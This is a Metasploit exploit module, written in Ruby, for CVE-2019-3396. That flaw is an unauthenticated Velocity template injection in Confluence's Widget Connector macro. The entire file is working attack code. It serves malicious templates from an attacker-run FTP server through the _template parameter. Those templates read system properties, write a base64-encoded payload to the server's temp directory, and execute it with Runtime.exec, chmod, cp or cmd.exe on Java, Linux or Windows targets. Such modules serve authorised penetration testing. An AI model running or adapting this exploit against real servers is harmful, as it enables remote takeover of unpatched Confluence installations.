# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::FtpServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Atlassian Confluence Widget Connector Macro Velocity Template Injection",
      &#039;Description&#039;    => %q{
        Widget Connector Macro is part of Atlassian Confluence Server and Data Center that
        allows embed online videos, slideshows, photostreams and more directly into page.
        A _template parameter can be used to inject remote Java code into a Velocity template,
        and gain code execution. Authentication is unrequired to exploit this vulnerability.
        By default, Java payload will be used because it is cross-platform, but you can also
        specify which native payload you want (Linux or Windows).

        Confluence before version 6.6.12, from version 6.7.0 before 6.12.3, from version
        6.13.0 before 6.13.3 and from version 6.14.0 before 6.14.2 are affected.

        This vulnerability was originally discovered by Daniil Dmitriev
        https://twitter.com/ddv_ua.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Daniil Dmitriev&#039;,                # Discovering vulnerability
          &#039;Dmitry (rrock) Shchannikov&#039;      # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-3396&#039; ],
          [ &#039;URL&#039;, &#039;https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html&#039; ],
          [ &#039;URL&#039;, &#039;https://chybeta.github.io/2019/04/06/Analysis-for-【CVE-2019-3396】-SSTI-and-RCE-in-Confluence-Server-via-Widget-Connector/&#039;],
          [ &#039;URL&#039;, &#039;https://paper.seebug.org/886/&#039;]
        ],
      &#039;Targets&#039;        =>
        [
          [ &#039;Java&#039;,    { &#039;Platform&#039; => &#039;java&#039;,  &#039;Arch&#039; => ARCH_JAVA }],
          [ &#039;Windows&#039;, { &#039;Platform&#039; => &#039;win&#039;,   &#039;Arch&#039; => ARCH_X86  }],
          [ &#039;Linux&#039;,   { &#039;Platform&#039; => &#039;linux&#039;, &#039;Arch&#039; => ARCH_X86  }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;RPORT&#039; => 8090,
          &#039;SRVPORT&#039; => 8021,
        },
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Mar 25 2019&#039;,
      &#039;DefaultTarget&#039;  => 0,
      &#039;Stance&#039;         => Msf::Exploit::Stance::Aggressive
    ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base to Confluence&#039;, &#039;/&#039;]),
        OptString.new(&#039;TRIGGERURL&#039;, [true, &#039;Url to external video service to trigger vulnerability&#039;,
          &#039;https://www.youtube.com/watch?v=dQw4w9WgXcQ&#039;])
      ])
  end

  # Handles ftp RETP command.
  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] RETR argument.
  # @return [void]
  def on_client_command_retr(c, arg)
    vprint_status("FTP download request for #{arg}")
    conn = establish_data_connection(c)
    if(not conn)
      c.put("425 Can&#039;t build data connection\r\n")
      return
    end

    c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
    case arg
    when /check\.vm$/
      conn.put(wrap(get_check_vm))
    when /javaprop\.vm$/
      conn.put(wrap(get_javaprop_vm))
    when /upload\.vm$/
      conn.put(wrap(get_upload_vm))
    when /exec\.vm$/
      conn.put(wrap(get_exec_vm))
    else
      conn.put(wrap(get_dummy_vm))
    end
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] PASS argument.
  # @return [void]
  def on_client_command_pass(c, arg)
    @state[c][:pass] = arg
    vprint_status("#{@state[c][:name]} LOGIN #{@state[c][:user]} / #{@state[c][:pass]}")
    c.put "230 Login OK\r\n"
  end

  #
  # @param c [Socket] Control connection socket.
  # @param arg [String] EPSV argument.
  # @return [void]
  def on_client_command_epsv(c, arg)
    vprint_status("#{@state[c][:name]} UNKNOWN &#039;EPSV #{arg}&#039;")
    c.put("500 &#039;EPSV #{arg}&#039;: command not understood.\r\n")
  end

  # Returns a upload template.
  #
  # @return [String]
  def get_upload_vm
    (
      <<~EOF
        $i18n.getClass().forName(&#039;java.io.FileOutputStream&#039;).getConstructor($i18n.getClass().forName(&#039;java.lang.String&#039;)).newInstance(&#039;#{@fname}&#039;).write($i18n.getClass().forName(&#039;sun.misc.BASE64Decoder&#039;).getConstructor(null).newInstance(null).decodeBuffer(&#039;#{@b64}&#039;))
      EOF
    )
  end

  # Returns a command execution template.
  #
  # @return [String]
  def get_exec_vm
    (
      <<~EOF
        $i18n.getClass().forName(&#039;java.lang.Runtime&#039;).getMethod(&#039;getRuntime&#039;, null).invoke(null, null).exec(&#039;#{@command}&#039;).waitFor()
      EOF
    )
  end

  # Returns checking template.
  #
  # @return [String]
  def get_check_vm
    (
      <<~EOF
        #{@check_text}
      EOF
    )
  end

  # Returns Java&#039;s getting property template.
  #
  # @return [String]
  def get_javaprop_vm
    (
      <<~EOF
        $i18n.getClass().forName(&#039;java.lang.System&#039;).getMethod(&#039;getProperty&#039;, $i18n.getClass().forName(&#039;java.lang.String&#039;)).invoke(null, &#039;#{@prop}&#039;).toString()
      EOF
    )
  end

  # Returns dummy template.
  #
  # @return [String]
  def get_dummy_vm
    (
      <<~EOF
      EOF
    )
  end

  # Checks the vulnerability.
  #
  # @return [Array] Check code
  def check
    checkcode = Exploit::CheckCode::Safe
    begin
      # Start the FTP service
      print_status("Starting the FTP server.")
      start_service

      @check_text = Rex::Text.rand_text_alpha(5..10)
      res = inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}check.vm")
      if res && res.body && res.body.include?(@check_text)
        checkcode = Exploit::CheckCode::Vulnerable
      end
    rescue Msf::Exploit::Failed => e
      vprint_error(e.message)
      checkcode = Exploit::CheckCode::Unknown
    end
    checkcode
  end

  # Injects Java code to the template.
  #
  # @param service_url [String] Address of template to injection.
  # @return [void]
  def inject_template(service_url, timeout=20)


    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => uri,
      &#039;headers&#039; => {
        &#039;Accept&#039; => &#039;*/*&#039;,
        &#039;Origin&#039; => full_uri(vhost_uri: true)
      },
      &#039;ctype&#039;  => &#039;application/json; charset=UTF-8&#039;,
      &#039;data&#039;   => {
                    &#039;contentId&#039; => &#039;1&#039;,
                    &#039;macro&#039; => {
                      &#039;name&#039; => &#039;widget&#039;,
                      &#039;body&#039; => &#039;&#039;,
                      &#039;params&#039; => {
                        &#039;url&#039; => datastore[&#039;TRIGGERURL&#039;],
                        &#039;_template&#039; => service_url
                      }

                    }
                  }.to_json
    }, timeout=timeout)

    unless res
      unless service_url.include?("exec.vm")
        print_warning(&#039;Connection timed out in #inject_template&#039;)
      end
      return
    end

    if res.body.include? &#039;widget-error&#039;
      print_error(&#039;Failed to inject and execute code:&#039;)
    else
      vprint_status("Server response:")
    end

    vprint_line(res.body)

    res
  end

  # Returns a system property for Java.
  #
  # @param prop [String] Name of the property to retrieve.
  # @return [String]
  def get_java_property(prop)
    @prop = prop
    res = inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}javaprop.vm")
    if res && res.body
      return clear_response(res.body)
    end
    &#039;&#039;
  end

  # Returns the target platform.
  #
  # @return [String]
  def get_target_platform
    return get_java_property(&#039;os.name&#039;)
  end

  # Checks if the target os/platform is compatible with the module target or not.
  #
  # @return [TrueClass] Compatible
  # @return [FalseClass] Not compatible
  def target_platform_compat?(target_platform)
    target.platform.names.each do |n|
      if n.downcase == &#039;java&#039; || target_platform.downcase.include?(n.downcase)
        return true
      end
    end

    false
  end

  # Returns a temp path from the remote target.
  #
  # @return [String]
  def get_tmp_path
    return get_java_property(&#039;java.io.tmpdir&#039;)
  end

  # Returns the Java home path used by Confluence.
  #
  # @return [String]
  def get_java_home_path
    return get_java_property(&#039;java.home&#039;)
  end

  # Returns Java code that can be used to inject to the template in order to copy a file.
  #
  # @note The purpose of this method is to have a file that is not busy, so we can execute it.
  #       It is meant to be used with #get_write_file_code.
  #
  # @param fname [String] The file to copy
  # @param new_fname [String] The new file
  # @return [void]
  def get_dup_file_code(fname, new_fname)
    if fname =~ /^\/[[:print:]]+/
      @command = "cp #{fname} #{new_fname}"
    else
      @command = "cmd.exe /C copy #{fname} #{new_fname}"
    end

    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}exec.vm")
  end

  # Returns the normalized file path for payload.
  #
  # @return [String]
  def normalize_payload_fname(tmp_path, fname)
    # A quick way to check platform insteaf of actually grabbing os.name in Java system properties.
    if /^\/[[:print:]]+/ === tmp_path
      Rex::FileUtils.normalize_unix_path(tmp_path, fname)
    else
      Rex::FileUtils.normalize_win_path(tmp_path, fname)
    end
  end

  # Exploits the target in Java platform.
  #
  # @return [void]
  def exploit_as_java

    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, &#039;Unable to get the temp path.&#039;)
    end

    @fname    = normalize_payload_fname(tmp_path, "#{Rex::Text.rand_text_alpha(5)}.jar")
    @b64      = Rex::Text.encode_base64(payload.encoded_jar)
    @command   = &#039;&#039;

    java_home = get_java_home_path

    if java_home.blank?
      fail_with(Failure::Unknown, &#039;Unable to find java home path on the remote machine.&#039;)
    else
      vprint_status("Found Java home path: #{java_home}")
    end

    register_files_for_cleanup(@fname)

    if /^\/[[:print:]]+/ === @fname
      normalized_java_path = Rex::FileUtils.normalize_unix_path(java_home, &#039;/bin/java&#039;)
      @command = %Q|#{normalized_java_path} -jar #{@fname}|
    else
      normalized_java_path = Rex::FileUtils.normalize_win_path(java_home, &#039;\\bin\\java.exe&#039;)
      @fname.gsub!(/Program Files/, &#039;PROGRA~1&#039;)
      @command = %Q|cmd.exe /C "#{normalized_java_path}" -jar #{@fname}|
    end

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    print_status("Attempting to execute #{@fname}")
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end


  # Exploits the target in Windows platform.
  #
  # @return [void]
  def exploit_as_windows
    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, &#039;Unable to get the temp path.&#039;)
    end

    @b64      = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))
    @fname    = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    new_fname = normalize_payload_fname(tmp_path,"#{Rex::Text.rand_text_alpha(5)}.exe")
    @fname.gsub!(/Program Files/, &#039;PROGRA~1&#039;)
    new_fname.gsub!(/Program Files/, &#039;PROGRA~1&#039;)
    register_files_for_cleanup(@fname, new_fname)

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    print_status("Attempting to copy payload to #{new_fname}")
    get_dup_file_code(@fname, new_fname)

    print_status("Attempting to execute #{new_fname}")
    @command = new_fname
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end


  # Exploits the target in Linux platform.
  #
  # @return [void]
  def exploit_as_linux
    tmp_path = get_tmp_path

    if tmp_path.blank?
      fail_with(Failure::Unknown, &#039;Unable to get the temp path.&#039;)
    end

    @b64      = Rex::Text.encode_base64(generate_payload_exe(code: payload.encoded, arch: target.arch, platform: target.platform))
    @fname    = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(5))
    new_fname = normalize_payload_fname(tmp_path, Rex::Text.rand_text_alpha(6))
    register_files_for_cleanup(@fname, new_fname)

    print_status("Attempting to upload #{@fname}")
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}upload.vm")

    @command = "chmod +x #{@fname}"
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}exec.vm")

    print_status("Attempting to copy payload to #{new_fname}")
    get_dup_file_code(@fname, new_fname)

    print_status("Attempting to execute #{new_fname}")
    @command = new_fname
    inject_template("ftp://#{datastore[&#039;SRVHOST&#039;]}:#{datastore[&#039;SRVPORT&#039;]}/#{Rex::Text.rand_text_alpha(5)}exec.vm", timeout=5)
  end

  def exploit
    @wrap_marker = Rex::Text.rand_text_alpha(5..10)

    # Start the FTP service
    print_status("Starting the FTP server.")
    start_service

    target_platform = get_target_platform
    if target_platform.nil?
      fail_with(Failure::Unreachable, &#039;Target did not respond to OS check.  Confirm RHOSTS and RPORT, then run "check".&#039;)
    else
      print_status("Target being detected as: #{target_platform}")
    end

    unless target_platform_compat?(target_platform)
      fail_with(Failure::BadConfig, &#039;Selected module target does not match the actual target.&#039;)
    end

    case target.name.downcase
    when /java$/
      exploit_as_java
    when /windows$/
      exploit_as_windows
    when /linux$/
      exploit_as_linux
    end
  end

  # Wraps request.
  #
  # @return [String]
  def wrap(string)
    "#{@wrap_marker}\n#{string}#{@wrap_marker}\n"
  end

  # Returns unwrapped response.
  #
  # @return [String]
  def clear_response(string)
    if match = string.match(/#{@wrap_marker}\n(.*)\n#{@wrap_marker}\n/m)
      return match.captures[0]
    end
  end
end

